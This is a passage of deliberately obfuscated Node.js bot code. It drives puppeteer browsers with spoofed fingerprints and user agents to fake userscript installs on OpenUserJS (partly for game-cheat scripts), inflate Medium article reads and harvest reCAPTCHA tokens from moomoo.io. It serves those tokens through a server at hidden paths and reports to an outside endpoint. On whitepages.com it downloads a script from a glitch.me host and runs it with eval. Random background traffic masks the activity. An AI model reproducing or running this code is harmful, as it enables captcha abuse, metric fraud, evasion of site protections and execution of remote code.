      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + W(0xd),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + V(0xe, '2y50') + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2187 + 0x228b + -0x34 * 0x5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const X = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x246d + 0x229 * 0x5 + 0x29 * 0xa0)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + X(0x7) + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x451 + -0x3b * 0x46 + 0x14d7), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x2 * -0x16 + -0x93f * 0x1 + -0x3 * -0x345), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1a30 + -0x210c + 0x3b3c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x423 * 0x5 + 0x1fb3 + -0x3462; w < getRandomInt(-0x4a5 + -0x1 * -0x11d2 + -0xd2c, 0x13c4 + 0x23f2 * 0x1 + -0x37b1 * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1cc76 + -0x9e0b * -0x1 + 0x218cb);
        }
      }();
    }, -0x21c4 + -0x88 * 0x2 + 0x2338), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * 0xe20 + 0x22e1 + 0x3101 * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x3a0 * 0x9 + -0x13d * -0x1d + -0x4489 * 0x1, -0x4a9 * -0x1 + -0x2111 + 0x1c9a)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xe7f0 + -0x3f76 + 0x19c96);
    }, -0x12b6 * 0x2 + 0x4ab * 0x4 + 0x1324), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x140e * -0x1 + -0x44f * -0x2 + -0x1cac;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x18c6 + 0x17 * -0x175 + -0x1 * -0x4601), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xff + 0x2438 + 0x2339 * -0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x14e * 0x598 + -0x371 * -0x645 + -0x8b85);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xbc0 + 0xd0b + -0x1867);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x191b + -0x228e * -0x1 + 0x3ae1 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xf32 * -0x1 + 0x21ef * 0x1 + -0x1191);
}
doFlags['doOUJS'] && ((async () => {
  const Z = d,
    Y = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x20a0 + -0x2 * 0xc59 + 0x7ed * -0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x18cb + 0x2328 + -0x3bf2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1187 * 0x1 + 0x1202 * -0x1 + 0x2389, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1e27 + 0x1d9e + 0x1 * 0x89, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2996 + 0x1a90 + 0x3616),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * 0x228b + 0x389a + 0x1 * -0x3415),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + Y(0x2, 'YAyM') + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + Z(0xb) + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + Z(0x11) + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1a33 + 0x240e * 0x1 + 0x1d * -0x57; k < 0x199f + -0x18a4 + 0xf7 * -0x1; k++)
    setTimeout(f, (0x1c4fb + 0x15e27 + -0x238c2) * k * getRandomInt(-0x13ab + -0x59f * -0x2 + 0x86e, -0x21d * 0x7 + -0x33 * -0x19 + 0x9d3));
  setInterval(() => {
    f();
    for (let l = 0xb * -0x4f + 0xc22 * -0x1 + 0xf * 0x109; l < 0x1e48 + 0x14 + -0x1e58; l++)
      setTimeout(f, (-0x119de + -0xa66a * 0x2 + 0x1 * 0x35112) * l * getRandomInt(0x1 * -0x2551 + 0x2227 + -0x1 * -0x32b, 0x1818 + -0x14c5 + 0x35 * -0x10));
  }, 0x7f924 + 0x569fab + 0x123 * -0x22e5);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
